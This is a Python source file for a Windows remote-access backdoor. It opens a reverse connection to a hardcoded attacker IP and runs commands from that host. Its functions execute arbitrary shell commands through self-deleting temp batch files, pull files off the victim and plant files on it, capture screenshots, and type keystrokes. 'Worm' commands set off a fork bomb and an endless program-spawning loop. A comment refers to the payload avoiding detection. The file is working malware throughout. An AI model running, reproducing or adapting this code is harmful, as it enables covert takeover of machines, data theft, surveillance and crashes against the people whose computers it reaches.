from json import loads, dumps
from os import chdir, getcwd
from sys import exit  # - for actually payload to not get caught but for testing use normal exit
from socket import socket, AF_INET, SOCK_STREAM
from pynput.keyboard import Controller, Key
from subprocess import check_output, call, DEVNULL
from base64 import b64encode, b64decode
from pyautogui import screenshot
from tempfile import gettempdir


class Networking_and_Data_Transfer:

    def __init__(self):
        self.connect = socket(AF_INET, SOCK_STREAM)
        self.connect.connect(("192.168.255.94", 100)) # IP Address should be changed with the hacker's current IP Address

    def send(self, nrm_data):
        data = dumps(nrm_data)
        data = bytes(data, 'utf-8')
        self.connect.send(data)

    def recv(self):
        final_data = ""
        while True:
            try:
                data = self.connect.recv(1024)
                data = data.decode('utf-8')
                final_data = final_data + data
                return loads(final_data)
            except ValueError:
                continue

    def exit_conn(self):
        self.connect.close()
        exit()
        
        
def myread(path):
     with open(path, "rb") as file:
        return b64encode(file.read())

def mywrite(path, result):
    with open(path, "wb") as file:
        file.write(b64decode(result))


def output_shell(cmd):
     result = check_output(cmd, shell=True, stderr=DEVNULL, stdin=DEVNULL)
     result = result.decode('utf-8')
     net.send(result)

def execute_shell(cmd):
    bat_cmd = " ".join(cmd[1:len(cmd)])
    print(bat_cmd)
    bat_cmd = bytes(bat_cmd, 'utf-8')
    retain_path = getcwd()
    bat_cmd = b64encode(bat_cmd)
    path = gettempdir() + r"\win.bat"
    mywrite(path, bat_cmd)
    chdir(gettempdir())
    call(["win.bat"], shell=True)
    chdir(retain_path)
    call(["del", "/f", path], shell=True)
    net.send("\n[+]Command executed and file deleted\n")

def cd(cmd):
    path = " ".join(cmd[1:len(cmd)])
    chdir(path)
    net.send("\n[+]Directory Changed...\n")

def download(cmd):
    path = " ".join(cmd[1:len(cmd)])
    result = myread(path)
    result = result.decode('utf-8')
    net.send(result)

def upload(cmd):
    net.send("\n[+]Trying To write...\n")
    result = net.recv()
    path = cmd[1].split('/')
    result = bytes(result, 'utf-8')
    mywrite(path[-1], result,)
    net.send("[+]File Uploaded...\n")

def worm(bat_cmd):
    bat_cmd = b64encode(bat_cmd)
    path = gettempdir() + r"\win.bat"
    mywrite(path, bat_cmd)
    chdir(gettempdir())
    net.send("\n[+]Warning: System is getting BOMBED, it will reach a unstable state and the connection will be lost...\n")
    call(["win.bat"], shell=True)

def screensnap():
    path = gettempdir() + r"\win.png"
    prin_scr = screenshot()
    prin_scr.save(path)
    result = myread(path)
    result = result.decode('utf-8')
    net.send(result)
    call(["del", "/f", path], shell=True)

def type_text(cmd):
    text = " ".join(cmd[1:len(cmd)])
    key.type(text)
    net.send("\n[+]Text has been typed\n")

def press_enter():
    key.press(Key.enter)
    net.send("\n[+]Enter has been pressed\n")


def shell():
    while True:
        try:
            while True:
                cmd = net.recv()
                if cmd[0] == "exit":
                    net.exit_conn()
                elif cmd[0] == "execute":
                    execute_shell(cmd)
                    continue
                elif cmd[0] == "cd" and len(cmd) > 1:
                    cd(cmd)
                    continue
                elif cmd[0] == "download":
                    print("Before down")
                    download(cmd)
                    print("after down")
                    continue
                elif cmd[0] == "upload":
                    upload(cmd)
                    continue
                elif cmd[0] == "worm" and cmd[1] == "fbomb":
                    bat_cmd = b"%0|%0"
                    worm(bat_cmd)
                    continue
                elif cmd[0] == "worm" and cmd[1] == "abomb":
                    bat_cmd = b":x\nstart mspaint \nstart notepad \nstart cmd  \nstart explorer  \nstart control  \nstart calc  \ngoto x"
                    worm(bat_cmd)
                elif cmd[0] == "screenshot":
                    screensnap()
                    continue
                elif cmd[0] == 'type':
                    type_text(cmd)
                    continue
                elif cmd[0] == 'press' and cmd[1] == 'enter':
                    press_enter()
                    continue
                else:
                    output_shell(cmd)
        except KeyboardInterrupt:
            net.send("\n[+]Wrong Data...\n")
            continue


try:
    net = Networking_and_Data_Transfer()
    key = Controller()
    shell()
except KeyboardInterrupt:
    exit()